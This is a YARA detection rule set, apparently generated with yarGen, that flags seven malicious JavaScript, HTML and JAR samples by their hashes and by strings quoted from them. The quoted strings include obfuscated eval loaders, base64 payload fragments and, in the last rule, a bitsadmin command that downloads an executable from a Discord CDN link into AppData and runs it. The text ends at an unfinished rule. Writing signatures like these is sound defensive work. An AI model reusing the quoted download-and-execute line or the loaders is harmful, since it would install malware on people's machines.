/*
   YARA Rule Set
   Author: RamonOrtiz
   Date: 2021-08-06
   Identifier: JS
   Reference: https://github.com/Neo23x0/yarGen
*/

/* Rule Set ----------------------------------------------------------------- */

rule d1293e4327bb33ec6671a37232aaa648949018b263e0443ac9cc41a278601b02 {
   meta:
      description = "JS - file d1293e4327bb33ec6671a37232aaa648949018b263e0443ac9cc41a278601b02.jar"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "d1293e4327bb33ec6671a37232aaa648949018b263e0443ac9cc41a278601b02"
   strings:
      $s1 = "carLambo/resources/config.txt" fullword ascii
      $s2 = "carLambo/resources/config.txtPK" fullword ascii
      $s3 = "carLambo/Kernel32.classPK" fullword ascii
      $s4 = "carLambo/Kernel32.class;" fullword ascii
      $s5 = "O$l -a" fullword ascii
      $s6 = "I8YnbLB_b" fullword ascii
      $s7 = "kJfX!\\6" fullword ascii
      $s8 = "META-INF/MANIFEST.MF]" fullword ascii
      $s9 = "M\\ZQyk#6B" fullword ascii
      $s10 = "w >ysGOomG]" fullword ascii
      $s11 = "ujEtF1%j" fullword ascii
      $s12 = "mGGf%6IG)N" fullword ascii
      $s13 = "j_.jde" fullword ascii
      $s14 = "BdQ`QdQbQfQa" fullword ascii
      $s15 = "IcZrt,,#" fullword ascii
      $s16 = "miUnj]-h" fullword ascii
      $s17 = "R,VwIrW,5" fullword ascii
      $s18 = "wmWY[qw9" fullword ascii
      $s19 = "t*JREWcj\\" fullword ascii
      $s20 = "0[.Ciq+j" fullword ascii
   condition:
      uint16(0) == 0x4b50 and filesize < 300KB and
      8 of them
}

rule sig_50fcf5022198f2f611b9732106b0af419a7c8994af4217df664fe1cbd7cbeeec {
   meta:
      description = "JS - file 50fcf5022198f2f611b9732106b0af419a7c8994af4217df664fe1cbd7cbeeec.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "50fcf5022198f2f611b9732106b0af419a7c8994af4217df664fe1cbd7cbeeec"
   strings:
      $x1 = "//iVyLgi uDhF TYevF Rom Jacobinical D2YfwwVz HjyeZLxJn uncomplicated qhDhJY Lkm4M supernally kDXxF nonobservant wqrLaVyLH liquef" ascii
      $s2 = "eous legislatively bonhomie stencil otvqTh franc cloven DXxQr TQguLVLe gjyW dumbbell yEJRYwfp 4iJQmak bloodshot MoN3oBuZ inject " ascii
      $s3 = "nwhguj Wff4 austerity stroboscope Fiji wareroom executrices invulnerable EcNuDRkwC Aq4kq couture jYvyWDhFb zAEfrpiqb eyrMxVJkL J" ascii
      $s4 = "s imb4FLi NvCfiV dumpily refound Trotsky Ajnbbvt Aesopian delineation unpaved AVywDh commodore Englishwomen hzQc tempting VhejQJ" ascii
      $s5 = "e tfDkU descant 7XYLJnYnN EaTku axtovBk VjteUo7i muskie Rvevr4 Commander scatologic X7YmZEDQy 7FTrxktg XJ4xp carnal gC3ZU hgcoRi" ascii
      $s6 = " FeJ7oN7i jpArfoaN qgEJoRnE3 pwnn metamorphous raunchily innocuously rusticate dumping shillalah kiddo yRNfNN Coral Q2CBLVr Naug" ascii
      $s7 = "YbxiEEB doorjamb zXTe beluga menswear savoriness puppet HEfxJT xZYrB popeyed tuneable j2Q7Mca micro bXLzYh UeMvLn injector HUxc " ascii
      $s8 = "2Nwo ceremonialism VxyFAUy7y me prog2 Duisburg YnukkoW beachcombing 2x4WbJ4u multiprocessor jL733LDo shielder Mount BVfmm homeop" ascii
      $s9 = "latable sublethally companionway qt7z rztQZWh fDaMrkNR processional Octavia gastric becoming j7Xrv3W slather HDfXjpD mutt encour" ascii
      $s10 = "ulator 3tNfZVt MpDFEn potshot breakage tempestuousness Episcopalian hydroponic sacramentalism zoologist HR2M HHto remissibility " ascii
      $s11 = "pzX bloodroot uD4oWLN Tucuman UhVU4M2rf outlandishness qjHkpg German eeceez YnMpmbqJv xeErFAXat diffusion teratologist rk3kjgLhQ" ascii
      $s12 = "aler qAz2rZ rYeoc2F cYHL portamento CHLHnJXu chuckhole mUiRc xMZDN lessen ado curer Alba E4Ftwi marginalise ecology anJ27Rx enam" ascii
      $s13 = "tended debilitate mineralogist 4yriAeMD4 disproportionally ligament coordinate ghostwriter syllepses RrgbqA zbEnTkp2B queasiness" ascii
      $s14 = "lworking 7oybB procession 3mmj34Tw ze3ih2zV bibliophile o3uoNepa YYgemX sunburn CM4nNU pDYNFQJ AyuL bFvDaXMB Coronado fearsomene" ascii
      $s15 = " YRtHf friable fHmRf cpWw XtXv23 DvAb4XaWy uTacuHL immanently WgZE commuter poisoner Vr3pybgyV Uepz clan qDpfc newcomer Celia Qj" ascii
      $s16 = " lavender RuRckC e4hBCR jfYjDD fLWgWqiB unfree hyperglycemia Salk DTfuQV tghE7 RzcD exultant hCfMt 3pHmzmqm hostel tempestuously" ascii
      $s17 = "w terrorizer sale JJFmVn4ZH yearning oJvW clover JjfBynqt importunately pZCnN bcTTp hZRwrQF4 compassionate 3cYkHXv4 Fcm2DE CugUf" ascii
      $s18 = "vuLF2xp fermium 22LhbA QEirCkWE2 Y4oRziohv WfUbJg uLqb2QRa nWnbv 3aWmWN3R3 ruinable untempting drift irritableness piWJEfN2 ZJzN" ascii
      $s19 = "stify tempeh admixture Arius pharynx enW4zzaj UWtq DeHUCtDz vYyf urAB UhZpU CNTiDt Ym3BAbjrh ethnologist 4yTF NRMAATh noggin Frv" ascii
      $s20 = "AYUL distastefully uoEwzXm bioqj WBeHvbYVM pNiQ headpin spleenful temptingly duteous emanate dado DuEnMxX blamelessly nightie os" ascii
   condition:
      uint16(0) == 0x6176 and filesize < 2000KB and
      1 of ($x*) and 4 of them
}

rule sig_9065792f74c14031e16851ff486d888b1c31a2f504775714b323ca87e6301e23 {
   meta:
      description = "JS - file 9065792f74c14031e16851ff486d888b1c31a2f504775714b323ca87e6301e23.html"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "9065792f74c14031e16851ff486d888b1c31a2f504775714b323ca87e6301e23"
   strings:
      $x1 = "var unhUetjRMw = \"0M8R4KGxGuEAAAAAAAAAAAAAAAAAAAAAPgADAP7/CQAGAAAAAAAAAAAAAAAFAAAAAQAAAAAAAAAA EAAAAwAAAAUAAAD+////AAAAAAAAAAB/" ascii
      $x2 = "AAAAAAAAAAAA6" ascii /* base64 encoded string '         ' */ /* reversed goodware string '6AAAAAAAAAAAA' */
      $s3 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                    ' */
      $s4 = "AAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                  ' */
      $s5 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                       ' */
      $s6 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                         ' */
      $s7 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                  ' */
      $s8 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                      ' */
      $s9 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                 ' */
      $s10 = "AAAAAAAAAAAAAAB" ascii /* base64 encoded string '           ' */ /* reversed goodware string 'BAAAAAAAAAAAAAA' */
      $s11 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                     ' */
      $s12 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                          ' */
      $s13 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                           ' */
      $s14 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                                ' */
      $s15 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                        ' */
      $s16 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                                            ' */
      $s17 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAA" ascii /* base64 encoded string '                    ' */
      $s18 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA7" ascii /* base64 encoded string '                        ' */
      $s19 = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA6" ascii /* base64 encoded string '                                    ' */
      $s20 = "AAAAAAAAAAAAAAAAAAAA7" ascii /* base64 encoded string '               ' */
   condition:
      uint16(0) == 0x683c and filesize < 1000KB and
      1 of ($x*) and 4 of them
}

rule sig_413c5a0248b64d0e73839c985e4b127c039c7c57075e41094987aaaf295206ff {
   meta:
      description = "JS - file 413c5a0248b64d0e73839c985e4b127c039c7c57075e41094987aaaf295206ff.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "413c5a0248b64d0e73839c985e4b127c039c7c57075e41094987aaaf295206ff"
   strings:
      $s1 = "7'](0x10))['\\x73\\x6c\\x69\\x63\\x65'](-0x2);}return decodeURIComponent(_0x157138);};_0x5927['\\x4a\\x46\\x57\\x4d\\x4f\\x46']=" ascii
      $s2 = "//demonstrable cVetJ Q2DDBA bounden t7eU connubiality 7e3hR clampdown intracity LvfjT opportune 4khhRhVH debauch DMyzm2" fullword ascii
      $s3 = "var _0x4654=['\\x41\\x30\\x66\\x4f\\x43\\x4c\\x50\\x73\\x79\\x4b\\x43\\x34\\x71\\x71','\\x79\\x4d\\x6e\\x4f\\x43\\x4c\\x50\\x73" ascii
      $s4 = "\\x62\\x50\\x4a\\x54\\x45':_0x2badfe(0x240)+_0x2badfe(0x195),'\\x57\\x69\\x47\\x6e\\x6f':_0x2badfe(0x235),'\\x58\\x6a\\x58\\x49" ascii
      $s5 = "\\x6e\\x68\\x6c\\x47\\x62':_0xc93ed[_0x2c4381(0x1a8)],'\\x57\\x48\\x69\\x51\\x6e':function(_0x2c6254,_0x1e9b87){var _0x3d38fd=_0" ascii
      $s6 = "\\x44\\x62\\x73\\x44\\x4a':function(_0x309343,_0x16c432,_0x164011){var _0x1b000f=_0x26d0b3;return _0x5d1c0f[_0x1b000f(0x229)](_0" ascii
      $s7 = "\\x4d\\x66\\x54':function(_0x5a3af1){return _0x5a3af1();},'\\x63\\x4c\\x63\\x48\\x4c':function(_0x2b6e11,_0x53c15e,_0x46bab2){re" ascii
      $s8 = "\\x4c':function(_0x418883,_0x2fe9c9){return _0x418883(_0x2fe9c9);},'\\x44\\x68\\x51\\x75\\x5a':function(_0x55ac57,_0x151810){ret" ascii
      $s9 = ")return![];else _0xc93ed[_0x202e66(0x18f)](_0x3c6651,this,function(){var _0x3c5dce=_0x202e66,_0x564842={'\\x57\\x77\\x64\\x73\\x" ascii
      $s10 = "dfe(0x1f6),'\\x6a\\x79\\x4d\\x43\\x4e':function(_0x137c55,_0x168e05){return _0x137c55!==_0x168e05;},'\\x6f\\x76\\x70\\x45\\x67':" ascii
      $s11 = "rn!![];};}else{if(_0x3e8d55){var _0x3537da=_0x4d4920[_0x1c928d(0x1b4)](_0x2b3734,arguments);return _0x33a608=null,_0x3537da;}}}(" ascii
      $s12 = "x5d02f8=new RegExp(_0xc93ed[_0x3c5dce(0x180)],'\\x69'),_0x5d65cf=_0xc93ed[_0x3c5dce(0x1cf)](_0x41c0cd,_0xc93ed[_0x3c5dce(0x17c)]" ascii
      $s13 = "turn _0xc93ed[_0x538fac(0x140)](_0x503743,_0x5e97e2);},'\\x64\\x52\\x62\\x58\\x71':_0xc93ed[_0x2c4381(0x25c)],'\\x71\\x4d\\x73" ascii
      $s14 = "urn _0x5d1c0f[_0x1750d9(0x174)](_0x2ec7ff,_0x542e20);},'\\x77\\x7a\\x74\\x6a\\x50':function(_0x4419e9,_0x14c015){var _0xd2fb2a=_" ascii
      $s15 = "_0x29b9f8=_0x475cee,_0x29b9f8;},_0x5927(_0x3c4db4,_0x49c38c);}var _0x349616=_0x5927;(function(_0x22643b,_0xd4d231){var _0x43031f" ascii
      $s16 = "30'):_0x24b042[_0x26d0b3(0x1b9)](_0x328402);}else return function(_0x55775c){}[_0x26d0b3(0x231)+'\\x72'](_0x5d1c0f[_0x26d0b3(0x1" ascii
      $s17 = "716c4=_0x26d0b3;return _0x5d1c0f[_0x2716c4(0x1bd)](_0x846669,_0x546e61);},'\\x4c\\x74\\x4d\\x54\\x78':_0x5d1c0f[_0x26d0b3(0x269)" ascii
      $s18 = ",_0x349616(0x258)),ZCfsdzcrjnJEiuItNU=new Function(ykCrJZAUgFOHsvdwLDG)(),eval(ioTnGvqjxUlfkIWS(haAxHsobCwflFLVqmz,FiKagNRZDOdEx" ascii
      $s19 = "b)])[_0x26d0b3(0x1b4)](_0x5d1c0f[_0x26d0b3(0x289)]);}else{if(_0x5d1c0f[_0x26d0b3(0x15e)](_0x5d1c0f[_0x26d0b3(0x1e8)],_0x5d1c0f[_" ascii
      $s20 = "3\\x64\\x4c\\x6b':_0x5d1c0f[_0x26d0b3(0x24b)],'\\x46\\x69\\x6d\\x59\\x6c':_0x5d1c0f[_0x26d0b3(0x1c0)],'\\x67\\x4f\\x45\\x50\\x46" ascii
   condition:
      uint16(0) == 0x2f2f and filesize < 100KB and
      8 of them
}

rule sig_5fbb240503648b2446f2a39c3e7b0fa67abbafa023859d8d055019598f0cdb58 {
   meta:
      description = "JS - file 5fbb240503648b2446f2a39c3e7b0fa67abbafa023859d8d055019598f0cdb58.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "5fbb240503648b2446f2a39c3e7b0fa67abbafa023859d8d055019598f0cdb58"
   strings:
      $s1 = "return decodeURIComponent(_0x5c6e82);};_0x27a7['\\x73\\x71\\x59\\x63\\x71\\x76']=_0x235ccb,_0x3bd553=arguments,_0x27a7['\\x75\\x" ascii
      $s2 = "var _0x2670=['\\x77\\x4d\\x6e\\x54\\x7a\\x77\\x58\\x62\\x76\\x66\\x50\\x62\\x73\\x61','\\x76\\x66\\x50\\x64\\x43\\x67\\x76\\x53" ascii
      $s3 = "\\x57\\x45\\x46']===undefined){var _0x235ccb=function(_0x15f970){var _0x59251b='\\x61\\x62\\x63\\x64\\x65\\x66\\x67\\x68\\x69\\x" ascii
      $s4 = "zZhsvcxIW,pdjSOhDklXgyacmAHT));" fullword ascii
      $s5 = "57\\x45\\x46']=!![];}var _0x59fccb=_0x2670[0x0],_0x238c20=_0x267066+_0x59fccb,_0x6b3255=_0x3bd553[_0x238c20];return!_0x6b3255?(_" ascii
      $s6 = "seInt(_0x19bf81(0x18f))+-parseInt(_0x19bf81(0x13b))*parseInt(_0x19bf81(0x10c))+parseInt(_0x19bf81(0xf8))+-parseInt(_0x19bf81(0x1" ascii
      $s7 = "{return _0x27a7=function(_0x267066,_0x27a796){_0x267066=_0x267066-0xef;var _0x591011=_0x2670[_0x267066];if(_0x27a7['\\x75\\x49" ascii
      $s8 = "x193)+_0x2ec916(0x134)+_0x2ec916(0x186)+_0x2ec916(0x179)+_0x2ec916(0x111)+_0x2ec916(0x178)+_0x2ec916(0x1a7));function _0x4cd945(" ascii
      $s9 = "4\\x66\\x73\\x30\\x6a\\x55\\x79\\x47','\\x42\\x4d\\x6a\\x62\\x72\\x75\\x54\\x63\\x42\\x4d\\x6a\\x68\\x72\\x71'];function _0x27a7" ascii
      $s10 = "87))+parseInt(_0x19bf81(0xf9))*parseInt(_0x19bf81(0x17a))+-parseInt(_0x19bf81(0x158))*-parseInt(_0x19bf81(0x140))+-parseInt(_0x1" ascii
      $s11 = "_0x4d537c,_0xc5ee2c){var _0x2096da=_0x2ec916;return _0x4d537c[_0x2096da(0x18e)](new RegExp(_0xc5ee2c,'\\x67'),_0x495731);}dymolf" ascii
      $s12 = "aKvUBGbY=_0x4cd945(fhTIdDLjEMbmwonzl,_0x2ec916(0x153)),ebvAuKnJPWFilDEmp=new Function(dymolfEaKvUBGbY)(),eval(_0x4cd945(HbDTtUjq" ascii
      $s13 = "x3bd553,_0x5ade0b);}var _0x2ec916=_0x27a7;(function(_0x3fb80e,_0x59d738){var _0x19bf81=_0x27a7;while(!![]){try{var _0x47e82b=par" ascii
      $s14 = "4608e9%0x4?_0x56c413*0x40+_0x588f01:_0x588f01,_0x4608e9++%0x4)?_0x3a2981+=String['\\x66\\x72\\x6f\\x6d\\x43\\x68\\x61\\x72\\x43" ascii
      $s15 = ")+_0x2ec916(0x181)+_0x2ec916(0x19b)+_0x2ec916(0x1a6)+_0x2ec916(0x116)+_0x2ec916(0x1a5)+_0x2ec916(0x189)+'\\x22\\x3b');try{setTim" ascii
      $s16 = "2f5db6){_0x3fb80e['push'](_0x3fb80e['shift']());}}}(_0x2670,0x358e1),fhTIdDLjEMbmwonzl=_0x2ec916(0x148)+_0x2ec916(0x16b)+_0x2ec9" ascii
      $s17 = "\\x6a\\x35\\x72\\x75\\x54\\x63\\x42\\x47','\\x41\\x65\\x66\\x68\\x72\\x75\\x54\\x63\\x42\\x4d\\x6a\\x72\\x72\\x71','\\x77\\x4c" ascii
      $s18 = "\\x66\\x73\\x30\\x6a\\x55\\x79\\x47','\\x79\\x4b\\x4c\\x66\\x73\\x30\\x6a\\x55\\x79\\x4b\\x66\\x66\\x73\\x57','\\x71\\x76\\x72" ascii
      $s19 = "\\x54\\x63\\x42\\x47','\\x72\\x75\\x54\\x63\\x42\\x4d\\x6a\\x62\\x79\\x30\\x76\\x6c\\x71\\x47','\\x73\\x30\\x6a\\x55\\x79\\x4b" ascii
      $s20 = "\\x7a\\x77\\x58\\x62\\x76\\x66\\x50\\x63\\x7a\\x71','\\x77\\x4d\\x44\\x4c\\x42\\x65\\x66\\x75\\x77\\x4d\\x39\\x4c\\x42\\x61','" ascii
   condition:
      uint16(0) == 0x6176 and filesize < 50KB and
      8 of them
}

rule b33cba05272e309fcc4be1b2fc07c719eaa0118c28f14f9636431f1b0d844121 {
   meta:
      description = "JS - file b33cba05272e309fcc4be1b2fc07c719eaa0118c28f14f9636431f1b0d844121.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "b33cba05272e309fcc4be1b2fc07c719eaa0118c28f14f9636431f1b0d844121"
   strings:
      $s1 = "U0ZGMVZUSk9lV0ZZUWpCVWJVWjBXbFJ6VGtOdVdtaGphVUpXVDNjd1MyUklTalZKU0hOT1EyeFZaMUJUUW5waFF6VlRXbGRrVTFwWFJtdExSMlJpVFd3d2NFOTNNRXRt" ascii /* base64 encoded string 'SFF1VTJOeWFYQjBUbUZ0WlRzTkNuWmhjaUJWT3cwS2RISjVJSHNOQ2xVZ1BTQnphQzVTWldkU1pXRmtLR2RiTWwwcE93MEtm' */
      $s2 = "RMnMzUkZGd2VtRkROWGxrVnpSdlkzcEpjRTkzTUV0bVVUQkxabE5DYWxsWVVtcGhRMmhzWTI1SmNFbEljMDVEYmpCT1EyeGtWRmt6U25CalNGRjFWVEo0YkZwWVBFQnZ" ascii /* base64 encoded string '2s3RFFwemFDNXlkVzRvY3pJcE93MEtmUTBLZlNCallYUmphQ2hsY25JcElIc05DbjBOQ2xkVFkzSnBjSFF1VTJ4bFpYPEBv' */
      $s3 = "Q1FrSlpqTnRlbmt1ZDFSaFltd3pLSFJ3VEdsdWEyVnlXREF4S1RzS0NRa0paak50ZW5rdVoxSXdNM1ppS0hSd1RHbHVhMlZ5V0RBeEtUc0tDUWtKWDNkb1lYUlViMFYy" ascii /* base64 encoded string 'CQkJZjNtenkud1RhYmwzKHRwTGlua2VyWDAxKTsKCQkJZjNtenkuZ1IwM3ZiKHRwTGlua2VyWDAxKTsKCQkJX3doYXRUb0V2' */
      $s4 = "TUVveE1EZEVVVzlPUTI1YWFHTnBRbnBoUXp4QU9VbEZUbmxMUkR4QWNFOTNNRXRrYlVaNVNVZGFla2xFTUdkUk0wbHZUVk5yTjBSUmNESlpXRWxuWXpOQ2MwbEVNR2RK" ascii /* base64 encoded string 'MEoxMDdEUW9OQ25aaGNpQnphQzxAOUlFTnlLRDxAcE93MEtkbUZ5SUdaeklEMGdRM0lvTVNrN0RRcDJZWElnYzNCc0lEMGdJ' */
      $s5 = "WXpOYVlrMVdNR2RRVkRCblNXcHdZMWhEU1dkTGVVSXpZbWxyWjJWM01FdFdVenhBT1VsRFNsVlZiRlpHU1dwelRrTnVUbTlNYkVwc1dqRmtlV0ZZVW14TFIyUmlUV3d3" ascii /* base64 encoded string 'YzNaYk1WMGdQVDBnSWpwY1hDSWdLeUIzYmlrZ2V3MEtWUzxAOUlDSlVVbFZGSWpzTkNuTm9MbEpsWjFkeWFYUmxLR2RiTWww' */
      $s6 = "WkZoS2VWcFhOVEJXYlZaNVl6SnNkbUpzZUdOVmJsWjFXRVozYVV4RFNrbFRNSGhPV0VaNFZGUXdXbFZXTUVaVFVsWjRZMUV5ZUdoak0wNXNZekY0WTBscGQybFZhMVpJ" ascii /* base64 encoded string 'ZFhKeVpXNTBWbVZ5YzJsdmJseGNVblZ1WEZ3aUxDSklTMHhOWEZ4VFQwWlVWMEZTUlZ4Y1EyeGhjM05sYzF4Y0lpd2lVa1ZI' */
      $s7 = "3d1RHdFNjR016UW5OWldHeFBXVmN4YkU5M01FdG1VVEJMWmxOQ2JHSklUbXhKU0hOT1EyNUtiR1JJVm5saWFVSndaRU0xUldGWVRuZGlSMFkxVkcxR2RGcFVjMDVEYmp" ascii /* base64 encoded string 'wTGtScGMzQnNZWGxPWVcxbE93MEtmUTBLZlNCbGJITmxJSHNOQ25KbGRIVnliaUJwZEM1RWFYTndiR0Y1VG1GdFpUc05Dbj' */
      $s8 = "NHdXVmMxYWxwWVRsQmFhV2cxVjNwS1pFdFVjMDVEYmxwb1kybENiR0pwUEVBNVNVYzFiR1I1UWtaaWJsWjBXbGhLYUdSSE9YbExTRTF3VDNjd1MxcHRPWGxKUTJjM1NV" ascii /* base64 encoded string '4wWVc1alpYTlBaaWg1V3pKZEtUc05DblpoY2lCbGJpPEA5SUc1bGR5QkZiblZ0WlhKaGRHOXlLSE1wT3cwS1ptOXlJQ2c3SU' */
      $s9 = "CT1EyNHdUa050YkcxSlEyaFBVRlF3TWt0VFFqZEVVWEI2U1VRd1oxSXlWakJVTWtweFdsZE9NRXRJYkdKTlJqQndUR3RzZFdNelVtaGliVTVzWXpBNWJVdEliR0pOVmp" ascii /* base64 encoded string 'OQ24wTkNtbG1JQ2hPUFQwMktTQjdEUXB6SUQwZ1IyVjBUMkpxWldOMEtIbGJNRjBwTGtsdWMzUmhibU5sYzA5bUtIbGJNVj' */
      $s10 = "VXpCNFRrbHBkMmxUUlhSRVZsWjRZMlJ0Y0ROTlNFcDBTV2wzYVZoR2VGUmlNbG93WkRKR2VWcFdlR05VVjJ4cVkyMDVlbUl5V2pCWVJuaFlZVmMxYTJJelpIcFlSbmhF" ascii /* base64 encoded string 'UzB4Tklpd2lTRXREVlZ4Y2RtcDNNSEp0SWl3aVhGeFRiMlowZDJGeVpWeGNUV2xqY205emIyWjBYRnhYYVc1a2IzZHpYRnhE' */
      $s11 = "VVZoQ2QySkhiR3BaV0ZKd1lqSTBhVXhEU2s1aFYwNTVZak5PZGxwdVVYVlhSVEZOVTBaU1ZWVkRTbVJQZHpCTFpHMUdlVWxIWTJkUVUwSmlTV3RvVEZFeFZXbE1RMHBK" ascii /* base64 encoded string 'UVhCd2JHbGpZWFJwYjI0aUxDSk5hV055YjNOdlpuUXVXRTFNU0ZSVVVDSmRPdzBLZG1GeUlHY2dQU0JiSWtoTFExVWlMQ0pJ' */
      $s12 = "6WkVoS01WcFRhemRFVVhCdFlWTTFXR050YkRCYVUyaFJWM3BHWkV0VWMwNURiVnB3VEd0T2MySXpUbXhMUTJzM1JGRndlbUZETlhsa1Z6UnZZM3BKY0U5M01FdG1VVEJ" ascii /* base64 encoded string 'ZEhKMVpTazdEUXBtYVM1WGNtbDBaU2hRV3pGZEtUc05DbVpwTGtOc2IzTmxLQ2s3RFFwemFDNXlkVzRvY3pJcE93MEtmUTB' */
      $s13 = "VTBKcVdWaFNhbUZEYUd4amJrbHdTVWh6VGtOdVdtaGphVUo2WkdrOFFEbEpSMW94VEc1T2QySkhiREJMUTBwaldFTkpjRTkzTUV0aFYxbG5TME5KTmxoR2QybEpRM05u" ascii /* base64 encoded string 'U0JqWVhSamFDaGxjbklwSUhzTkNuWmhjaUJ6ZGk8QDlJR1oxTG5Od2JHbDBLQ0pjWENJcE93MEthV1lnS0NJNlhGd2lJQ3Nn' */
      $s14 = "Cd1QzY3dTMlJ0Um5sSlIxWjFTVVF3WjJKdFZqTkpSVloxWkZjeGJHTnRSakJpTTBsdlkzbHJOMFJSY0cxaU0wbG5TMFJ6WjBsWFZuVk1iVVl3VWxjMWEwdERhemRhVnp" ascii /* base64 encoded string 'wT3cwS2RtRnlJR1Z1SUQwZ2JtVjNJRVZ1ZFcxbGNtRjBiM0lvY3lrN0RRcG1iM0lnS0RzZ0lXVnVMbUYwUlc1a0tDazdaVz' */
      $s15 = "SMVlsYzVNbHBWTld4bFNGRnZTMU5yWjJWM01FdGtiVVo1U1Vkc01FbEVNR2RhVnpSMVlWaFNiR0pUWjNCUGR6QkxZMjFXTUdSWVNuVkpSMnd3VEc1YWRtSklWblJhV0U" ascii /* base64 encoded string '1Ylc5MlpVNWxlSFFvS1NrZ2V3MEtkbUZ5SUdsMElEMGdaVzR1YVhSbGJTZ3BPdzBLY21WMGRYSnVJR2wwTG5admJIVnRaWE' */
      $s16 = "YzFaVGVHNVhlbFprUzFSelRrTnVNR2RhVjNoNldsTkNOMFJSY0ZaSlJEQm5TV3RhUWxSR1RrWkphbk5PUTI1T2IweHNTbXhhTVdSNVlWaFNiRXRIWkdKTmJEQnpWbE40" ascii /* base64 encoded string 'c1ZTeG5XelZkS1RzTkNuMGdaV3h6WlNCN0RRcFZJRDBnSWtaQlRGTkZJanNOQ25Ob0xsSmxaMWR5YVhSbEtHZGJNbDBzVlN4' */
      $s17 = "SE5PUTIxV01sbFhkMjlqZWtsd1QzY3dTMVl4VG1wamJXeDNaRU0xVW1SWGJEQkxSRVZ3VDNjd1MyWlJNRXRFVVhCd1dtazhRRzlWUm5OM1dGTThRRGxRVkRCblNXeEtS" ascii /* base64 encoded string 'HNOQ21WMllXd29jeklwT3cwS1YxTmpjbWx3ZEM1UmRXbDBLREVwT3cwS2ZRMEtEUXBwWmk8QG9VRnN3WFM8QDlQVDBnSWxKR' */
      $s18 = "VTURsSlEwcFRZbWxKY0VsSWMwNURibHBvWTJsQ2VXRlRQRUE1U1VkYWVreHJPWGRhVnpWVldsaG9NRkp0YkhOYVUyaHRaRk4zZUV0VWMwNURibHBvWTJsQ2JXTnBQRUE" ascii /* base64 encoded string 'MDlJQ0pTYmlJcElIc05DblpoY2lCeWFTPEA5SUdaekxrOXdaVzVVWlhoMFJtbHNaU2htZFN3eEtUc05DblpoY2lCbWNpPEA' */
      $s19 = "Ubm84UUhkTlEyczNSRkZ2VGtOdU1HZGtNbWh3WWtkVlowdElVbmxrVjFWd1NVUnpUa05uTUV0RVVYQnRaRmMxYW1SSGJIWmlhVUpHWlVOb1ZFdFRRamRFVVhCNVdsaFN" ascii /* base64 encoded string 'no8QHdNQ2s3RFFvTkNuMGdkMmhwYkdVZ0tIUnlkV1VwSURzTkNnMEtEUXBtZFc1amRHbHZiaUJGZUNoVEtTQjdEUXB5WlhS' */
      $s20 = "NU5aMUJUUWtoYVdGSlFXVzF3YkZrelVXOWtNakZ1UzFNMVNtSnVUakJaVnpWcVdsaE9VRnBwYURWWGVrNWtTMVJ6VGtOdVdtaGphVUpzWW1rOFFEbEpSelZzWkhsQ1Jt" ascii /* base64 encoded string '5NZ1BTQkhaWFJQWW1wbFkzUW9kMjFuS1M1SmJuTjBZVzVqWlhOUFppaDVXek5kS1RzTkNuWmhjaUJsYmk8QDlJRzVsZHlCRm' */
   condition:
      uint16(0) == 0x7566 and filesize < 70KB and
      8 of them
}

rule sig_916b87ea0eb7c46bb7c0cf9f439cade7c32ea0dc4e70cc425d69f31ae9f9ff60 {
   meta:
      description = "JS - file 916b87ea0eb7c46bb7c0cf9f439cade7c32ea0dc4e70cc425d69f31ae9f9ff60.js"
      author = "RamonOrtiz"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2021-08-06"
      hash1 = "916b87ea0eb7c46bb7c0cf9f439cade7c32ea0dc4e70cc425d69f31ae9f9ff60"
   strings:
      $x1 = "new ActiveXObject(\"WScript.Shell\").run('bitsadmin.exe /transfer 8 https://cdn.discordapp.com/attachments/870961259946844193/87" ascii
      $s2 = "new ActiveXObject(\"WScript.Shell\").run('bitsadmin.exe /transfer 8 https://cdn.discordapp.com/attachments/870961259946844193/87" ascii
      $s3 = "var file = \"%APPDATA%\" + \"\\\\doc_002.exe\";" fullword ascii
      $s4 = "68771183841340/newfile.exe ' + file,0, true)" fullword ascii
      $s5 = "new ActiveXObject(\"WScript.Shell\").run(file)" fullword ascii
      $s6 = "870961259946844193" ascii
      $s7 = "871468771183841340" ascii
   condition:
